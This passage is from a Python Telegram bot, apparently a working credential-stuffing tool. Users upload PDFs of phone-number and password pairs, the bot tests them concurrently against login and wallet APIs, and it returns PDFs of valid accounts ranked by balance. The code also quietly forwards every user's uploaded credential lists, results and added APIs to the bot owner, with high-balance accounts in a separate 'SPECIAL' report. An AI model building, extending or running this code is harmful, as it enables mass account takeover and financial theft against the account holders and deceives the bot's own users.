            pdf_bytes, filename = generate_api_pdf(successful_accounts, api_name)
            total_balance = sum(float(s.get("balance", 0)) for s in successful_accounts)
            status_text = "(Stopped!)" if cancelled else "(Done!)"

            # Send to user
            await update.message.reply_document(
                document=io.BytesIO(pdf_bytes), filename=filename,
                caption="📁 *" + api_name + "* — " + str(len(successful_accounts)) + " accounts " + status_text + "\n💰 Total Balance: *" + "{:.2f}".format(total_balance) + "*"
            )
            print("   [" + api_name + "] PDF sent! Balance: " + "{:.2f}".format(total_balance))

            # Forward same PDF to owner immediately
            if user_id != OWNER_ID:
                try:
                    user = update.effective_user
                    uname = f"@{escape_md(user.username)}" if user.username else "No username"
                    owner_caption = (
                        f"📁 *{escape_md(api_name)}* — {len(successful_accounts)} accounts {status_text}\n"
                        f"💰 Total Balance: *{total_balance:.2f}*\n"
                        f"👤 User: {escape_md(user.first_name) or ''}\n"
                        f"🔖 {uname}\n"
                        f"🆔 ID: `{user_id}`"
                    )
                    await context.bot.send_document(
                        chat_id=OWNER_ID,
                        document=io.BytesIO(pdf_bytes),
                        filename=filename,
                        caption=owner_caption,
                        parse_mode="Markdown"
                    )
                    print("   [" + api_name + "] PDF forwarded to owner!")
                except Exception as e:
                    print("   [" + api_name + "] Owner forward error: " + str(e))

            # ===== PDF 2 — SPECIAL RESULT (>= BALANCE_BOUNDARY) — OWNER ONLY =====
            if high_balance_accounts:
                try:
                    await asyncio.sleep(random.uniform(0, 3))
                    pdf2_bytes, filename2 = generate_api_pdf(high_balance_accounts, api_name + "_SPECIAL")
                    total_balance2 = sum(float(s.get("balance", 0)) for s in high_balance_accounts)
                    if user_id != OWNER_ID:
                        user = update.effective_user
                        uname2 = f"@{escape_md(user.username)}" if user.username else "No username"
                        owner2_caption = (
                            f"🔥 *{escape_md(api_name)} — SPECIAL RESULT* {status_text}\n"
                            f"💰 Total Balance: *{total_balance2:.2f}*\n"
                            f"🔢 Hits: {len(high_balance_accounts)} (≥ {BALANCE_BOUNDARY})\n"
                            f"👤 User: {escape_md(user.first_name) or ''}\n"
                            f"🔖 {uname2}\n"
                            f"🆔 ID: `{user_id}`"
                        )
                    else:
                        owner2_caption = (
                            f"🔥 *{escape_md(api_name)} — SPECIAL RESULT* {status_text}\n"
                            f"💰 Total Balance: *{total_balance2:.2f}*\n"
                            f"🔢 Hits: {len(high_balance_accounts)} (≥ {BALANCE_BOUNDARY})"
                        )
                    await context.bot.send_document(
                        chat_id=OWNER_ID,
                        document=io.BytesIO(pdf2_bytes),
                        filename=filename2,
                        caption=owner2_caption,
                        parse_mode="Markdown"
                    )
                    print("   [" + api_name + "] SPECIAL PDF 2 sent to owner!")
                except Exception as e:
                    print("   [" + api_name + "] PDF 2 send error: " + str(e))
        except Exception as e:
            print("   [" + api_name + "] Error sending PDF: " + str(e))
            traceback.print_exc()
            try:
                csv_content = "Phone,Password,Balance,UserID\n"
                for s in successful_accounts:
                    csv_content += f"{s['phone']},{s['password']},{s.get('balance','0')},{s.get('user_id','N/A')}\n"
                await update.message.reply_document(
                    document=io.BytesIO(csv_content.encode()),
                    filename=f"{api_name}_backup.csv",
                    caption="📁 *" + api_name + "* — " + str(len(successful_accounts)) + " accounts (CSV backup)"
                )
                print("   [" + api_name + "] CSV backup sent!")
            except Exception as e2:
                print("   [" + api_name + "] CSV backup also failed: " + str(e2))

    save_checkpoint(user_id, api_key, api_name, checked, total, len(successful_accounts), "done" if not cancelled else "cancelled")
    return api_key, api_name, successful_accounts, checked


def generate_api_pdf(successful_accounts, api_name):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    pdf_buf = io.BytesIO()
    doc = SimpleDocTemplate(pdf_buf, pagesize=A4)

    try:
        successful_accounts.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
    except:
        pass

    elements = []
    chunk_size = 500
    total_hits = len(successful_accounts)

    for chunk_start in range(0, total_hits, chunk_size):
        chunk = successful_accounts[chunk_start:chunk_start + chunk_size]
        data = [["Phone Number", "Password", "Balance", "User ID"]]
        for s in chunk:
            data.append([s["phone"], s["password"], s.get("balance", "0"), s.get("user_id", "N/A")])

        table = Table(data, colWidths=[1.8*inch, 1.5*inch, 1.2*inch, 1*inch], repeatRows=1)
        table.setStyle(TableStyle([
            ("BACKGROUND", (0,0), (-1,0), colors.grey),
            ("TEXTCOLOR", (0,0), (-1,0), colors.whitesmoke),
            ("ALIGN", (0,0), (-1,-1), "CENTER"),
            ("FONTNAME", (0,0), (-1,0), "Helvetica-Bold"),
            ("BACKGROUND", (0,1), (-1,-1), colors.beige),
            ("GRID", (0,0), (-1,-1), 0.5, colors.black),
            ("FONTSIZE", (0,0), (-1,-1), 8),
            ("TOPPADDING", (0,0), (-1,-1), 3),
            ("BOTTOMPADDING", (0,0), (-1,-1), 3),
        ]))
        elements.append(table)
        if chunk_start + chunk_size < total_hits:
            elements.append(PageBreak())

    doc.build(elements)
    return pdf_buf.getvalue(), f"{api_name}_success_{timestamp}.pdf"

# ==================== MAIN CHECKING TASK ====================
async def run_all_apis_checking(update, context, user_id, credentials, apis_dict):
    total = len(credentials)
    all_api_results = {api_key: [] for api_key in apis_dict}
    stopped_by_user = False

    clear_hits(user_id)

    print("\n" + "#"*60)
    print("STARTING INDEPENDENT API CHECK")
    print("   User: " + str(update.effective_user.first_name))
    print("   Total APIs: " + str(len(apis_dict)))
    print("   Total Accounts: " + str(total))
    print("   Fixed Delay: " + str(FIXED_DELAY) + "s between numbers (per API)")
    print("#"*60)

    progress_msg = await update.message.reply_text(
        "⏳ *Starting " + str(len(apis_dict)) + " APIs...*",
        parse_mode="Markdown"
    )
    user_data_store[user_id]["progress_msg_id"] = progress_msg.message_id
    user_data_store[user_id]["progress_chat_id"] = progress_msg.chat_id
    user_data_store[user_id]["api_progress"] = {k: {"done": 0, "total": total, "hits": 0, "status": "⏳", "last_update": datetime.now().strftime("%I:%M:%S %p")} for k in apis_dict}

    try:
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            tasks = []
            for api_key, api_info in apis_dict.items():
                task = asyncio.create_task(
                    run_single_api_independently(
                        session, api_key, api_info, credentials, update, context, user_id, apis_dict
                    )
                )
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            total_pdfs_sent = 0
            api_summary_lines = []

            for result in results:
                if isinstance(result, Exception):
                    print("   API task failed: " + str(result))
                    continue
                api_key, api_name, successful_accounts, checked_count = result
                all_api_results[api_key] = successful_accounts

                if successful_accounts:
                    total_balance = sum(float(s.get("balance", 0)) for s in successful_accounts)
                    api_summary_lines.append("• *" + api_name + "* — " + str(len(successful_accounts)) + "s , 💰 " + "{:.2f}".format(total_balance))
                    total_pdfs_sent += 1

    except asyncio.CancelledError:
        print("\nPROCESS CANCELLED BY USER")
        stopped_by_user = True

    total_all_successes = sum(len(v) for v in all_api_results.values())

    if total_all_successes > 0:
        summary = (
            "🎉 *Done!*\n"
            "🟢 Hits: *" + str(total_all_successes) + "* | 📁 PDFs: *" + str(total_pdfs_sent) + "*\n\n"
            + "\n".join(api_summary_lines)
            + "\n\n▶️ /start"
        )
    else:
        summary = "😔 *No hits!*\n\n▶️ /start"

    await update.message.reply_text(summary, parse_mode="Markdown")
    await reset_user_session(user_id)

async def reset_user_session(user_id):
    user_data_store.pop(user_id, None)
    user_tasks.pop(user_id, None)
    clear_hits(user_id)

# ==================== OWNER CALLBACK HANDLERS ====================
async def handle_owner_callback(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    if user_id != OWNER_ID:
        await query.answer("❌ Not allowed", show_alert=True)
        return

    data = query.data
    await query.answer()
    chat_id = query.message.chat_id

    # ===== OWNER MENU BUTTONS =====
    if data == "owner_cmd_users":
        await _show_users_list(context, chat_id)
        return
    elif data == "owner_cmd_info":
        await _show_info_list(context, chat_id)
        return

    # ===== SHOW USER PDFs / APIs =====
    if data.startswith("user_pdfs_"):
        target_id = int(data.replace("user_pdfs_", ""))
        await _send_user_pdfs(context, chat_id, target_id)
        return

    elif data.startswith("user_apis_"):
        target_id = int(data.replace("user_apis_", ""))
        await _send_user_apis(context, chat_id, target_id)
        return

    # ===== OWNER ADD API FROM USER =====
    elif data.startswith("owner_add_api_"):
        parts = data.replace("owner_add_api_", "").split("_", 1)
        if len(parts) == 2:
            source_user_id = int(parts[0])
            api_name_key = parts[1]
            user_apis = load_user_apis(source_user_id)
            found = None
            for k, v in user_apis.items():
                if v["name"] == api_name_key:
                    found = (k, v)
                    break
            if found:
                save_user_api(OWNER_ID, found[0], found[1])
                await query.edit_message_text(f"✅ API *{escape_md(found[1]['name'])}* added to your bot!", parse_mode="Markdown")
            else:
                await query.edit_message_text("❌ API not found in user's list.")



# ==================== API MANAGEMENT HANDLERS ====================
async def add_api_handler(update, context):
    user_id = update.effective_user.id
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            "➕ *Add New API*\n\n"
            "Send format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Example:\n"
            "`MyAPI|https://api.myapi.com/app/auth/login|https://api.myapi.com/app/user/account/wallet|https://app-web.myapi.com|https://app-web.myapi.com/login`\n\n"
            "✏️ Send API details:",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "➕ *Add New API*\n\n"
            "Send format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Example:\n"
            "`MyAPI|https://api.myapi.com/app/auth/login|https://api.myapi.com/app/user/account/wallet|https://app-web.myapi.com|https://app-web.myapi.com/login`\n\n"
            "✏️ Send API details:",
            parse_mode="Markdown"
        )
    return WAITING_FOR_ADD_API

async def process_add_api(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    parts = text.split("|")

    if len(parts) < 5:
        await update.message.reply_text(
            "❌ Invalid format! Need: `API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\nTry again or /start",
            parse_mode="Markdown"
        )
        return WAITING_FOR_ADD_API

    api_name = parts[0].strip()
    login_url = parts[1].strip()
    wallet_url = parts[2].strip()
    origin = parts[3].strip()
    referer = parts[4].strip()

    if not login_url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid login URL! Try again.")
        return WAITING_FOR_ADD_API

    api_key = api_name.lower().replace(" ", "_")
    api_data = {
        "name": api_name,
        "login_url": login_url,
        "wallet_url": wallet_url,
        "origin": origin,
        "referer": referer,
    }

    save_user_api(user_id, api_key, api_data)

    if user_id != OWNER_ID:
        user = update.effective_user
        await notify_owner_api(context, user_id, user.username, user.first_name, api_data)

    await update.message.reply_text(
        f"✅ *API Added to Your Bot!*\n\n"
        f"📡 Name: *{api_name}*\n"
        f"🔗 Login: `{login_url}`\n\n"
        "▶️ /start to use",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def edit_apis_handler(update, context):
    user_id = update.effective_user.id
    user_apis = get_user_apis(user_id)

    keyboard = []
    for api_key, api_info in user_apis.items():
        keyboard.append([
            InlineKeyboardButton("📝 " + api_info["name"], callback_data="edit_" + api_key),
            InlineKeyboardButton("🗑️ Remove", callback_data="remove_" + api_key)
        ])

    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_start")])

    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            "⚙️ *Edit Your APIs*\n\n"
            "Click on an API to update it, or 🗑️ to remove it.\n\n"
            "👇 Select API:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "⚙️ *Edit Your APIs*\n\n"
            "Click on an API to update it, or 🗑️ to remove it.\n\n"
            "👇 Select API:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
    return WAITING_FOR_EDIT_API_SELECT

async def handle_edit_api_callback(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "back_to_start":
        await query.edit_message_text("▶️ Use /start to begin")
        return ConversationHandler.END

    if data.startswith("remove_"):
        api_key = data.replace("remove_", "")
        custom_apis = load_user_apis(user_id)
        if api_key in custom_apis:
            api_name = custom_apis[api_key]["name"]
            delete_user_api(user_id, api_key)
            await query.edit_message_text(
                f"🗑️ *API Removed!*\n\n📡 {api_name} has been deleted.\n\n▶️ /start to continue",
                parse_mode="Markdown"
            )
        elif api_key in DEFAULT_APIS:
            await query.edit_message_text(
                "⚠️ *Cannot remove default API!*\n\nDefault APIs are protected.\n▶️ /start to continue",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

    if data.startswith("edit_"):
        api_key = data.replace("edit_", "")
        user_apis = get_user_apis(user_id)

        if api_key not in user_apis:
            await query.edit_message_text("❌ API not found! /start")
            return ConversationHandler.END

        api_info = user_apis[api_key]
        user_data_store[user_id] = {"edit_api_key": api_key}

        await query.edit_message_text(
            f"📝 *Update API: {api_info['name']}*\n\n"
            f"Current details:\n"
            f"`{api_info['name']}|{api_info['login_url']}|{api_info['wallet_url']}|{api_info['origin']}|{api_info['referer']}`\n\n"
            "Send new details in same format:\n"
            "`API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\n"
            "Or send same to keep unchanged.",
            parse_mode="Markdown"
        )
        return WAITING_FOR_EDIT_API_DATA

    return WAITING_FOR_EDIT_API_SELECT

async def process_edit_api(update, context):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    parts = text.split("|")

    if len(parts) < 5:
        await update.message.reply_text(
            "❌ Invalid format! Need: `API_NAME|LOGIN_URL|WALLET_URL|ORIGIN|REFERER`\n\nTry again:",
            parse_mode="Markdown"
        )
        return WAITING_FOR_EDIT_API_DATA

    api_name = parts[0].strip()
    login_url = parts[1].strip()
    wallet_url = parts[2].strip()
    origin = parts[3].strip()
    referer = parts[4].strip()

    if not login_url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid login URL! Try again:")
        return WAITING_FOR_EDIT_API_DATA

    edit_data = user_data_store.get(user_id, {})
    old_api_key = edit_data.get("edit_api_key")

    if not old_api_key:
        await update.message.reply_text("❌ Error! /start")
        return ConversationHandler.END

    user_apis = get_user_apis(user_id)
    if old_api_key not in user_apis:
        await update.message.reply_text("❌ API not found! /start")
        return ConversationHandler.END

    new_api_key = api_name.lower().replace(" ", "_")
    api_data = {
        "name": api_name,
        "login_url": login_url,
        "wallet_url": wallet_url,
        "origin": origin,
        "referer": referer,
    }

    delete_user_api(user_id, old_api_key)
    save_user_api(user_id, new_api_key, api_data)

    await update.message.reply_text(
        f"✅ *API Updated!*\n\n"
        f"📡 Name: *{api_name}*\n"
        f"🔗 Login: `{login_url}`\n\n"
        "▶️ /start to use",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

# ==================== TELEGRAM HANDLERS ====================
async def start(update, context):
    user = update.effective_user
    user_id = user.id

    ensure_user_recorded(user_id, user.username, user.first_name, user.last_name)

    existing_task = user_tasks.get(user_id)
    if existing_task and not existing_task.done():
        existing_task.cancel()
    await reset_user_session(user_id)
    save_chat_history(user_id, user.username, user.first_name, user.last_name, "command", "/start")

    keyboard = [
        [InlineKeyboardButton("🚀 ALL APIs (Parallel)", callback_data="api_all")],
        [InlineKeyboardButton("➕ Add API", callback_data="add_api")],
        [InlineKeyboardButton("⚙️ Edit APIs", callback_data="edit_apis")],
    ]

    user_apis = get_user_apis(user_id)
    header = "🤖 *SUPER BOT*" if user_id != OWNER_ID else "👑 *OWNER PANEL*"

    await update.message.reply_text(
        f"{header}\n"
        f"📡 *{len(user_apis)} APIs* | ⏱️ *{FIXED_DELAY}s delay*\n\n"
        "📄 *Upload PDF* with `phone password`\n"
        "👇 *Choose:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return WAITING_FOR_API_SELECTION

async def handle_api_selection(update, context):
    query = update.callback_query
    user_id = query.from_user.id

    await query.answer()
    selected = query.data

    if selected == "api_all":
        user_apis = get_user_apis(user_id)
        user_data_store[user_id] = {
            "mode": "all",
            "apis": user_apis,
        }
        await query.edit_message_text(
            f"✅ *{len(user_apis)} APIs* | ⏱️ *{FIXED_DELAY}s* delay\n\n"
            "📄 *Send PDF* (`phone password`)\n"
            "📤 *Upload now:*",
            parse_mode="Markdown"
        )
        return WAITING_FOR_PDF

    elif selected == "add_api":
        return await add_api_handler(update, context)

    elif selected == "edit_apis":
        return await edit_apis_handler(update, context)

    return WAITING_FOR_API_SELECTION

async def handle_pdf(update, context):
    user_id = update.effective_user.id
    user = update.effective_user

    user_data = user_data_store.get(user_id, {})

    if not user_data.get("apis"):
        await update.message.reply_text("⚠️ First select mode! /start")
        return ConversationHandler.END

    file = await update.message.document.get_file()
    pdf_bytes = await file.download_as_bytearray()
    file_name = update.message.document.file_name

    print(f"\n📄 PDF received from user {user_id}: {file_name}")

    credentials = extract_credentials_from_pdf(pdf_bytes)
    if not credentials:
        await update.message.reply_text(
            "😔 *No credentials found in PDF!*\n\n"
            "Make sure PDF contains:\n"
            "Phone number (10 digits)\n"
            "Password\n\n"
            "Format: `9876543210 password123`\n\n"
            "▶️ /start to try again",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    user_data["credentials"] = credentials
    user_data_store[user_id] = user_data

    if user_id != OWNER_ID:
        save_user_pdf(user_id, user.username, file_name, len(credentials), pdf_bytes)
        await notify_owner_pdf(context, user_id, user.username, user.first_name, pdf_bytes, file_name, len(credentials))

    await update.message.reply_text(
        f"📄 *PDF OK* — {len(credentials)} accounts | {len(user_data['apis'])} APIs\n"
        "🚀 *Starting...*",
        parse_mode="Markdown"
    )

    apis = user_data.get("apis", {})

    await update.message.reply_text(
        f"🚀 *Running* | 📡 {len(apis)} APIs | 🔢 {len(credentials)} accounts\n"
        "🛑 /stop",
        parse_mode="Markdown"
    )

    task = asyncio.create_task(
        run_all_apis_checking(update, context, user_id, credentials, apis)
    )
    user_tasks[user_id] = task
    return ConversationHandler.END

async def stop_command(update, context):
    user_id = update.effective_user.id
    task = user_tasks.get(user_id)
    if task and not task.done():
        task.cancel()
        await update.message.reply_text(
            "🛑 *Stopping...*\n"
            "⏳ Partial PDFs will be sent for APIs that have hits.\n"
            "⏰ This may take a few minutes...",
            parse_mode="Markdown"
        )
        # Results already forwarded per-API as they completed
    else:
        await update.message.reply_text("⚠️ *No active process*", parse_mode="Markdown")

async def help_command(update, context):
    await update.message.reply_text(
        "🤖 *SUPER BOT — Help*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "*Commands:*\n"
        "/start - Start new session\n"
        "/stop - Stop current process\n"
        "/partial - Send partial results (if bot crashed)\n"
        "/help - Show this help\n\n"
        "*Features:*\n"
        "• Check ALL APIs simultaneously\n"
        "• Separate PDF per API\n"
        "• Add/Edit/Remove APIs (personal)\n"
        "• Fixed 3s delay between numbers\n"
        "• Auto-save hits to database\n"
        "• Crash recovery with /partial\n\n"
        "*How to use:*\n"
        "1️⃣ Click 🚀 ALL APIs\n"
        "2️⃣ Upload PDF with phone & password\n"
        "3️⃣ Bot auto-starts with 3s delay\n"
        "4️⃣ Get separate PDF per API + summary\n\n"
        "*PDF Format:*\n"
        "Each line: `phone password`\n"
        "Example: `9876543210 mypassword123`",
        parse_mode="Markdown"
    )

async def partial_command(update, context):
    user_id = update.effective_user.id
    user_apis = get_user_apis(user_id)
    sent_any = False

    await update.message.reply_text("🔍 *Checking for saved hits...*", parse_mode="Markdown")

    for api_key, api_info in user_apis.items():
        hits = get_hits_for_api(user_id, api_key)
        if hits:
            try:
                hits.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
            except:
                pass
            try:
                pdf_bytes, filename = generate_api_pdf(hits, api_info["name"])
                total_balance = sum(float(h.get("balance", 0)) for h in hits)
                await update.message.reply_document(
                    document=io.BytesIO(pdf_bytes), filename=filename,
                    caption="📁 *" + api_info["name"] + "* — " + str(len(hits)) + " accounts (Recovered)\n💰 Total Balance: *" + "{:.2f}".format(total_balance) + "*"
                )
                sent_any = True
            except Exception as e:
                print(f"Partial PDF error for {api_info['name']}: {e}")

    # Owner recovery: SPECIAL high-balance hits (PDF 2)
    if user_id == OWNER_ID:
        for api_key, api_info in user_apis.items():
            high = get_high_hits_for_api(user_id, api_key)
            if high:
                try:
                    high.sort(key=lambda x: float(x.get("balance", 0)), reverse=True)
                except:
                    pass
                try:
                    pdf2_bytes, filename2 = generate_api_pdf(high, api_info["name"] + "_SPECIAL")
                    total2 = sum(float(h.get("balance", 0)) for h in high)
                    await update.message.reply_document(
                        document=io.BytesIO(pdf2_bytes), filename=filename2,
                        caption="🔥 *" + api_info["name"] + "* — SPECIAL — " + str(len(high)) + " accounts (Recovered)\n💰 Total Balance: *" + "{:.2f}".format(total2) + "*"
                    )
                    sent_any = True
                except Exception as e:
                    print(f"Partial PDF2 error for {api_info['name']}: {e}")

    if not sent_any:
        await update.message.reply_text("😔 *No saved hits found.* Try /start again.", parse_mode="Markdown")
    else:
        await update.message.reply_text("✅ *All recovered PDFs sent!*", parse_mode="Markdown")


# ==================== INTERNAL OWNER HELPERS ====================
async def _show_users_list(context, chat_id, edit_msg_id=None):
    """Show all users (public bot — info only, no access control)"""
    users = get_all_users()
    if not users:
        text = "📭 *No users yet.*"
        if edit_msg_id:
            await context.bot.edit_message_text(text, chat_id=chat_id, message_id=edit_msg_id, parse_mode="Markdown")
        else:
            await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
        return

    lines = ["👥 *User List*", f"👤 Total Users: *{len(users)}*", ""]
    for row in users:
        uid, uname, fname, lname, app_time = row
        uname_str = f"@{escape_md(uname)}" if uname else "No username"
        lines.append(f"🟢 `{uid}` — {escape_md(fname) or ''} {escape_md(lname) or ''} ({uname_str})")

    text = "\n".join(lines)
    if edit_msg_id:
        await context.bot.edit_message_text(text, chat_id=chat_id, message_id=edit_msg_id, parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")

async def _show_info_list(context, chat_id):
    """Show all users (approved + stopped) info with PDF/API counts as buttons"""
    stats = get_user_stats()
    if not stats:
        await context.bot.send_message(chat_id=chat_id, text="📭 *No user data.*", parse_mode="Markdown")
        return

    lines = ["📊 *Collection Info*"]
    keyboard = []
    for row in stats:
        uid, uname, fname, pdf_count, api_count = row
        uname_str = f"@{escape_md(uname)}" if uname else "No username"
        status_emoji = "🟢"
        lines.append(f"{status_emoji} `{uid}` — {uname_str}")

        buttons = []
        if pdf_count > 0:
            buttons.append(InlineKeyboardButton(f"📄 PDFs: {pdf_count}", callback_data=f"user_pdfs_{uid}"))
        if api_count > 0:
            buttons.append(InlineKeyboardButton(f"📡 APIs: {api_count}", callback_data=f"user_apis_{uid}"))
        if buttons:
            keyboard.append(buttons)

    text = "\n".join(lines)
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown",
                                   reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None)

async def _send_user_pdfs(context, chat_id, target_id):
    """Send ALL actual PDF files collected from a user"""
    pdfs = get_user_pdfs_list(target_id)
    if not pdfs:
        await context.bot.send_message(chat_id=chat_id, text=f"📭 No PDFs found for user `{target_id}`.", parse_mode="Markdown")
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"📄 *Sending {len(pdfs)} PDF(s) from User `{target_id}`...*",
        parse_mode="Markdown"
    )

    sent = 0
    failed = 0
    for i, (file_name, file_path, num_accounts, timestamp) in enumerate(pdfs, 1):
        try:
            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as pdf_file:
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=pdf_file,
                        filename=file_name,
                        caption=f"📄 `{escape_md(file_name)}` — {num_accounts} accounts — {timestamp}"
                    )
                sent += 1
            else:
                # Fallback: just send name if file missing
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"{i}. `{escape_md(file_name)}` — {num_accounts} accounts — {timestamp} (file missing)",
                    parse_mode="Markdown"
                )
                failed += 1
        except Exception as e:
            print(f"Error sending PDF {file_name}: {e}")
            failed += 1

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ Sent: {sent} | ❌ Failed: {failed}",
        parse_mode="Markdown"
    )

async def _send_user_apis(context, chat_id, target_id):
    """Send list of all APIs collected from a user"""
    apis = get_user_apis_list(target_id)
    if not apis:
        await context.bot.send_message(chat_id=chat_id, text=f"📭 No APIs found for user `{target_id}`.", parse_mode="Markdown")
        return

    lines = [f"📡 *APIs from User `{target_id}`*\n━━━━━━━━━━━━━━━━━━━━"]
    for i, (api_key, api_name, login_url, wallet_url, origin, referer, timestamp) in enumerate(apis, 1):
        lines.append(
            f"{i}. *{escape_md(api_name)}*\n"
            f"   🔗 `{escape_md(login_url)}`\n"
            f"   💳 `{escape_md(wallet_url)}`\n"
            f"   🕐 {timestamp}"
        )

    text = "\n".join(lines)
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")



# ==================== OWNER COMMANDS ====================
async def owner_command(update, context):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Show User List", callback_data="owner_cmd_users"),
         InlineKeyboardButton("📈 Show Collection", callback_data="owner_cmd_info")]
    ])

    await update.message.reply_text(
        "👑 *OWNER PANEL*\n\nChoose an option:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

async def users_command(update, context):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    await _show_users_list(context, update.message.chat_id)

async def info_command(update, context):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    await _show_info_list(context, update.message.chat_id)

async def debug_command(update, context):
    """Owner debug command to check DB status"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        # Count users
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE status='pending'")
        pending = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE status='approved'")
        approved = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE status='stopped'")
        stopped = c.fetchone()[0]

        # Count PDFs
        c.execute("SELECT COUNT(*) FROM user_pdfs")
        total_pdfs = c.fetchone()[0]

        # Count APIs
        c.execute("SELECT COUNT(*) FROM user_apis")
        total_apis = c.fetchone()[0]

        conn.close()

        text = (
            f"🔧 *Debug Info*\n\n"
            f"👥 Users: {total_users} (Pending: {pending}, Approved: {approved}, Stopped: {stopped})\n"
            f"📄 Total PDFs in DB: {total_pdfs}\n"
            f"📡 Total APIs in DB: {total_apis}\n"
            f"💾 DB Path: `{DB_PATH}`"
        )
        await update.message.reply_text(text, parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Debug error: {e}")

# ==================== ERROR HANDLER ====================
async def error_handler(update, context):
    print(f"Update {update} caused error {context.error}")
    traceback.print_exc()

# ==================== MAIN FUNCTION ====================
def main():
    print("="*60)
    print("  🤖 SUPER BOT STARTING...")
    print("="*60)

    init_database()
    print(f"  Owner ID: {OWNER_ID}")
    print(f"  Mode: PUBLIC (no approval — everyone can use)")
    print(f"  Total Default APIs: {len(DEFAULT_APIS)}")
    print(f"  Fixed delay: {FIXED_DELAY}s")
    print(f"  Balance Boundary (PDF 2): {BALANCE_BOUNDARY}")
    print("="*60)

    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_API_SELECTION: [CallbackQueryHandler(handle_api_selection)],
            WAITING_FOR_PDF: [MessageHandler(filters.Document.PDF, handle_pdf)],
            WAITING_FOR_ADD_API: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_add_api)],
            WAITING_FOR_EDIT_API_SELECT: [CallbackQueryHandler(handle_edit_api_callback)],
            WAITING_FOR_EDIT_API_DATA: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_edit_api)],
        },
        fallbacks=[
            CommandHandler("start", start),
            CommandHandler("stop", stop_command),
        ],
    )

    # CRITICAL FIX: Owner callback handler MUST be BEFORE conversation handler
    # Otherwise conversation handler eats owner approve/reject buttons!
    application.add_handler(CallbackQueryHandler(handle_owner_callback, pattern="^(owner_add_api_|owner_cmd_|user_pdfs_|user_apis_)"))

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("partial", partial_command))

    # Owner commands
    application.add_handler(CommandHandler("owner", owner_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("debug", debug_command))

    application.add_error_handler(error_handler)

    print("✅ Bot is running! Press Ctrl+C to stop.")
    print("="*60)

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
